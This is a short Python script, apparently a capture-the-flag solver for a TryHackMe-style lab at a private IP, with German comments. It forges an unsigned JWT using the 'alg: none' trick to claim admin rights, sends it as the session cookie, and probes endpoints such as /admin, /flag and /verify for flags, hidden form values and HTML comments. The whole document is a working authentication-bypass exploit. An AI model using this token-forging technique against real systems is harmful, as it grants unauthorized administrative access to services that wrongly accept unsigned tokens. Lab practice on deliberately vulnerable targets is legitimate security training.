import base64, json, re, requests

TARGET = "http://10.113.167.230:5000"

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_jwt_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."

s = requests.Session()
s.post(f"{TARGET}/login", data={"username": "admin"})

token = forge_jwt_none({"username": "admin", "role": "admin", "is_admin": True})
cookies = {"session": token}

for ep in ["/verify", "/compose", "/admin", "/flag", "/dashboard", "/"]:
    r = s.get(f"{TARGET}{ep}", cookies=cookies)
    flags = re.findall(r"THM\{[^}]+\}|flag\{[^}]+\}|FLAG\{[^}]+\}", r.text, re.IGNORECASE)
    if flags:
        print(f"\n★ FLAG bei {ep}: {flags[0]}\n")
    else:
        hidden = re.findall(r'value="([^"]{8,})"', r.text)
        comments = re.findall(r"<!--(.{0,100})-->", r.text)
        print(f"{ep}: HTTP {r.status_code} | values={hidden[:3]} | comments={comments[:2]}")

# Auch POST /verify testen mit leerem Body
print("\n--- POST /verify mit leerem Token ---")
for body in [
    {"token": token, "message": "test"},
    {"signed_message": token},
    {"signature": "test", "message": "test"},
]:
    r = s.post(f"{TARGET}/verify", data=body, cookies=cookies)
    flags = re.findall(r"THM\{[^}]+\}|flag\{[^}]+\}|FLAG\{[^}]+\}", r.text, re.IGNORECASE)
    if flags:
        print(f"★ FLAG: {flags[0]}")
    else:
        print(f"  Body={body} → {r.status_code} | {r.text[200:400]}")
